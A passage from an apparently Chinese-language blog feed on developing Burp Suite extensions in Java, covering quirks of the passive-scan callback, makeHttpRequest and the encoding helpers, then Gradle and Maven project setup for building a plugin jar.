方法添加<code>issue</code>）</li><li><code>java.util.List&lt;IScanIssue&gt; doPassiveScan(IHttpRequestResponse baseRequestResponse)</code>：被动检测时被调用，返回值为issue列表，其会被加到Burp的Dashboard的<code>Issue Activity</code>面板里。</li></ul><p>调用burp主动扫描的一种方式是在请求项上<code>右键 - Do Active Scan</code>。对于被动检测，burp默认会在<code>Dashboard</code> 的<code>Task</code>面板中建立一个<code>Audit checks - passive</code>的任务，该任务就是对<code>Proxy</code>流量进行被动检测，或者自己在请求项上<code>右键 - Do passive scan</code>。</p><p>Github上很多burp被动扫描插件会在<code>IScannerCheck</code>的 <code>doPassiveScan</code>这个回调方法上发包检测漏洞，但官方建议是在这个回调方法里不发包，仅做数据包检测（如匹配敏感信息等），所以被动扫描器跟<code>burp</code>的<code>doPassiveScan</code>被动检测的”被动“不是一个意思。</p><p>假如一个FastJson被动扫描插件在<code>doPassiveScan</code>这个回调方法里做检测，且该插件有一个是否开启FastJson扫描的配置，就会出现这样的bug：</p><ol><li>用户将浏览器流量代理到burp，且FastJson被动扫描插件为关闭状态。</li><li>用户访问 <code>https://example.com/api</code>，burp会调用<code>doPassiveScan</code>回调方法，但FastJson被动扫描插件为关闭状态，插件直接不检测。</li><li>用户开启FastJson被动扫描插件，再访问<code>https://example.com/api</code>，burp不会再调用<code>doPassiveScan</code>回调方法了，导致即使开启了FastJson被动扫描插件也不会对<code>https://example.com/api</code>扫描。</li></ol><p>原因在于，burp对于拥有相同的URL路径和参数键名的不同请求只会调用一次<code>doPassiveScan</code>。这个行为可以在 <code>Dashboard - Task - &quot;Audit check - passive&quot; - Depulication</code>配置里进行关闭。</p><p>所以如果想要实现一个burp被动扫描插件，应该监听Proxy流量，然后自行判断该请求是否扫描过，避免重复扫描。</p><h2 id="makeHttpRequest"><a href="#makeHttpRequest" class="headerlink" title="makeHttpRequest"></a>makeHttpRequest</h2><p>调用<code>IBurpExtenderCallbacks</code>的<code>makeHttpRequest</code>方法来发送http请求，有几个问题：</p><ul><li><p>该方法为同步发送请求，没有提供异步发送的方式。</p></li><li><p>该方法不跟踪跳转。（测试发现，跟burp的<code>Settings - Network - HTTP - Allowed redirect type</code>这个配置无关）</p></li><li><p>有个默认的超时时间（120秒），可在burp的<code>Settings - Network - Connections - Timeouts</code>里配置。大部分用户不会去配置，导致用<code>burp api</code>发大量请求时会比较慢。 <code>makeHttpRequest</code>方法没有设置超时时间的参数。</p></li><li><p>发生连接不上、超时等错误时也不会抛异常。只能通过返回值判断下是否发生错误：</p><ul><li><p><code>IHttpRequestResponse makeHttpRequest(IHttpService httpService, byte[] request)</code>：返回值<code>IHttpRequestResponse</code>对象的<code>getResponse()</code>方法返回 <code>null</code>或者长度为0的byte数组。</p></li><li><p><code>byte[] makeHttpRequest(java.lang.String host, int port, boolean useHttps, byte[] request)</code> ：返回值为 <code>null</code>或者长度为0的byte数组。</p><p>具体的错误信息只在 Burp 的 <code>Dashboard - Event Log</code>里可以看到。</p></li></ul></li></ul><p>如果不使用burp提供的API，而是用第三方库（如okhttp3）发送请求，需要注意：</p><ul><li>发送的请求不会被记录到<code>Logger</code>面板里。</li><li>burp里的配置不会影响到第三方库，如代理设置。</li></ul><h2 id="urlEncode-和-urlDecode"><a href="#urlEncode-和-urlDecode" class="headerlink" title="urlEncode 和 urlDecode"></a>urlEncode 和 urlDecode</h2><p><code>IExtensionHelpers</code>对象提供的URL编码和URL解码函数：</p><ul><li><code>byte[] urlDecode(byte[] data)</code></li><li><code>java.lang.String urlDecode(java.lang.String data)</code></li><li><code>byte[] urlEncode(byte[] data)</code>：不对<code>&#39;&lt;&gt;/\&quot;</code>等编码，对<code>?#@:</code>等编码，将空格转为<code>+</code>号而不是<code>%20</code>。</li><li><code>java.lang.String urlEncode(java.lang.String data)</code>：同上</li></ul><p>这几个函数并不处理编码方式。下方示例会打印乱码与错误结果：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        callbacks.printOutput(helpers.urlDecode(<span class="hljs-string">&quot;%e4%b8%ad%e6%96%87&quot;</span>)); <span class="hljs-comment">// 打印乱码。</span><br>        callbacks.printOutput(helpers.urlEncode(<span class="hljs-string">&quot;测测&quot;</span>));  <span class="hljs-comment">// 打印错误结果 &quot;KK&quot;</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果要URL解码支持中文，需调用URL解码为byte数组，再指定编码方式将byte数组转为字符串。示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br><br>        <span class="hljs-type">byte</span>[] utf8Bytes = helpers.urlDecode(<span class="hljs-string">&quot;%e4%b8%ad%e6%96%87&quot;</span>.getBytes());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">utf8String</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(utf8Bytes, StandardCharsets.UTF_8);<br>        callbacks.printOutput(utf8String);  <span class="hljs-comment">// 输出 &quot;中文&quot;</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果要对中文进行URL编码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br>        callbacks.printOutput(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(helpers.urlEncode(<span class="hljs-string">&quot;中+文&quot;</span>.getBytes(StandardCharsets.UTF_8))));<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>上方示例并没有输出期望的结果 <code>&quot;%e4%b8%ad%2b%e6%96%87&quot;</code>，而是输出 <code>&quot;中%2b文&quot;</code>。这是因为burp的<code>urlEncode</code>方法不对不可见字节（如空字节、0xe4）进行url编码。所以想要期望的效果，需要自己实现URL编码方法了。</p><h2 id="bytesToString-和-stringToBytes"><a href="#bytesToString-和-stringToBytes" class="headerlink" title="bytesToString 和 stringToBytes"></a>bytesToString 和 stringToBytes</h2><p><code>IExtensionHelpers</code>对象提供的在字节数组与字符串之间转换的方法：</p><ul><li><p><code>java.lang.String bytesToString(byte[] data)</code></p></li><li><p><code>byte[] stringToBytes(java.lang.String data)</code></p><p>这两个方法也是不考虑编码方式，直接将字符串中的各个char字符和byte之间转换。示例：</p></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        <span class="hljs-type">IExtensionHelpers</span> <span class="hljs-variable">helpers</span> <span class="hljs-operator">=</span> callbacks.getHelpers();<br><br>        callbacks.printOutput(helpers.bytesToString(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;(<span class="hljs-type">byte</span>) <span class="hljs-number">0xe6</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0x90</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0x9c</span>&#125;)); <span class="hljs-comment">// 输出 乱码</span><br>        callbacks.printOutput(hexEncode(helpers.bytesToString(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;(<span class="hljs-type">byte</span>) <span class="hljs-number">0xe6</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0x90</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0x9c</span>&#125;))); <span class="hljs-comment">// 输出 e6909c</span><br><br>        callbacks.printOutput(hexEncode(<span class="hljs-string">&quot;中&quot;</span>)); <span class="hljs-comment">// 输出 4e2d （&quot;中&quot; 的Unicode码为U+4e2d，因为Java里的字符串按Unicode编码方式存储）</span><br>        callbacks.printOutput(hexEncode(helpers.stringToBytes(<span class="hljs-string">&quot;中文&quot;</span>))); <span class="hljs-comment">// 输出 2d87 （ 这个结果怎么来的： &quot;中&quot;的Unicode码为 U+4e2d， &quot;文&quot;的Unicode码为 U+6587，各取一个字节，拼接为 2d87）</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">hexEncode</span><span class="hljs-params">(String data)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">hexContent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> b : data.toCharArray()) &#123;<br>            hexContent.append(String.format(<span class="hljs-string">&quot;%02x&quot;</span>, (<span class="hljs-type">int</span>) b));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> hexContent.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">hexEncode</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">hexContent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : data) &#123;<br>            hexContent.append(String.format(<span class="hljs-string">&quot;%02x&quot;</span>, b));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> hexContent.toString();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果考虑中文字符的编码，就不要用这两个方法，使用：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// byte数组转字符串</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;(<span class="hljs-type">byte</span>) <span class="hljs-number">0xe4</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0xb8</span>, (<span class="hljs-type">byte</span>) <span class="hljs-number">0xad</span>&#125;, StandardCharsets.UTF_8);<br><br><span class="hljs-comment">// 字符串转byte数组</span><br><span class="hljs-string">&quot;中文&quot;</span>.getBytes(StandardCharsets.UTF_8);<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Burpsuite</tag>
      
      <tag>Web安全</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Burpsuite Java插件开发 - 基础篇</title>
    <link href="/2024/01/18/burpsuite-java-extension-code-env/"/>
    <url>/2024/01/18/burpsuite-java-extension-code-env/</url>
    
    <content type="html"><![CDATA[<p>BurpSuite插件可以使用Java、Python或Ruby来编写，因为BurpSuite（以下简称为BP或Burp）本身是用Java写的，通常插件的开发也是用Java来编写。如果用Python编写，还要安装Jython，而且在安装一些Python模块时可能会报错，加上目前Jython不支持Python 3，所以用Python写写BP小插件还行，功能多的话还是推荐用Java写。</p><p>本文主要内容是使用Java编写BP插件时，如何使用IDEA构建 Gradle 和 Maven 项目，编写一个Hello World插件，与如何调试插件。网上这类文章很多了，我主要补充一些在网上没看到的。</p><p>文中用到的BP版本为 Burpsuite Pro v2023.4.5， IDEA版本为2023.1.2。</p><h3 id="IDEA-Gradle-开发"><a href="#IDEA-Gradle-开发" class="headerlink" title="IDEA + Gradle 开发"></a>IDEA + Gradle 开发</h3><p>使用IDEA新建一个Gradle项目：</p><p><img src="burpsuite-java-extension-code-env-1.png" alt="burpsuite-java-extension-code-env-1.png"></p><p><code>Build System</code>选择<code>Gradle</code>，<code>Gradle DSL</code>选择<code>Groovy</code>。</p><p>修改<code>build.gradle</code>文件，引入编写BP插件需要的API库：</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy">plugins &#123;<br>    id <span class="hljs-string">&#x27;java&#x27;</span><br>&#125;<br><br>repositories &#123;<br>    mavenCentral()<br>&#125;<br><br>sourceSets &#123;<br>    main &#123;<br>        java &#123;<br>            srcDir <span class="hljs-string">&#x27;./src/main/java&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>tasks.register(<span class="hljs-string">&#x27;fatJar&#x27;</span>, Jar) &#123;<br>    archivesBaseName = project.name + <span class="hljs-string">&#x27;-all&#x27;</span><br>    from &#123; configurations.runtimeClasspath.collect &#123; it.isDirectory() ? it : zipTree(it) &#125; &#125;<br>    with jar<br>&#125;<br><br>dependencies &#123;<br>    implementation <span class="hljs-string">&#x27;net.portswigger.burp.extender:burp-extender-api:1.7.22&#x27;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>我本机使用的是Gradle 8，如果是低版本的Gradle，由于build.gradle配置文件的语法略有不同，可能需要改一下，主要是fatJar这块要改为：</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy">task fatJar(<span class="hljs-attr">type:</span> Jar) &#123;<br>    baseName = project.name + <span class="hljs-string">&#x27;-all&#x27;</span><br>    from &#123; configurations.compile.collect &#123; it.isDirectory() ? it : zipTree(it) &#125; &#125;<br>    with jar<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后<code>implementation</code> 指令改为 <code>compile</code> 。</p><p>接着在源码目录（<code>src/main/java/</code>）下新建<code>burp</code>目录，再在<code>burp</code>目录下新建一个<code>BurpExtender</code>类，再复制官方提供的HelloWorld示例 <a href="https://github.com/PortSwigger/example-hello-world/blob/master/java/BurpExtender.java">BurpExtender.java</a> 代码过来。</p><p>然后点击IDEA右侧的Gradle工具窗口 - 刷新按钮，让Gradle重新加载配置文件，下载依赖库。（如果没看到Gradle工具按钮，就点 <code>View -&gt; Tool Windows -&gt; Gradle</code> 打开）</p><p><img src="burpsuite-java-extension-code-env-2.png" alt="burpsuite-java-extension-code-env-2.png"></p><p>如果一切OK，再点击运行<code>Tasks - other - fastJar</code>，编译一个jar包出来。 这个jar包在项目根目录下的<code>build/libs</code> 目录。用BurpSuite加载这个Jar，运行你的第一个BP插件吧。</p><h3 id="IDEA-Maven-开发"><a href="#IDEA-Maven-开发" class="headerlink" title="IDEA + Maven 开发"></a>IDEA + Maven 开发</h3><p>用IDEA新建一个Maven项目</p><p><img src="burpsuite-java-extension-code-env-3.png" alt="burpsuite-java-extension-code-env-3.png"></p><p><code>Build System</code>选择<code>Maven</code>。</p><p>修改pom.xml文件为：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HelloBPMaven<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-shade-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>shade<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.11.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">addMavenDescriptor</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">addMavenDescriptor</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Built-By</span>&gt;</span>XX<span class="hljs-tag">&lt;/<span class="hljs-name">Built-By</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.portswigger.burp.extender<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>burp-extender-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.22<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>主要是加上了<code>build</code>和<code>dependencies</code>块。<code>dependencies</code>块引入BP插件API库，<code>build</code>块里配置<code>maven-shade-plugin</code>插件在打包时可以将项目的依赖也打入jar包里。</p><p>由于打包后的jar包里，<code>META-INF/MANIFEST.MF</code>文件的<code>Built-By</code>字段默认是本地计算机用户名，所以加上对<code>maven-jar-plugin</code>插件的配置，将<code>Built-By</code>字段值覆盖掉，避免信息泄露。</p><p>接着在源码目录（<code>src/main/java/</code>）下新建<code>burp</code>目录，再在<code>burp</code>目录下新建一个<code>BurpExtender</code>类，再复制官方提供的HelloWorld示例 <a href="https://github.com/PortSwigger/example-hello-world/blob/master/java/BurpExtender.java">BurpExtender.java</a> 代码过来。</p><p>然后点击IDEA右侧的Maven工具窗口 - 刷新按钮，让Maven重新加载配置文件，下载依赖库。</p><p><img src="burpsuite-java-extension-code-env-4.png" alt="burpsuite-java-extension-code-env-4.png"></p><p>如果一切OK，再点击运行<code>Lifecycle - package</code>，编译一个jar包出来。 这个jar包在项目根目录下的<code>target</code> 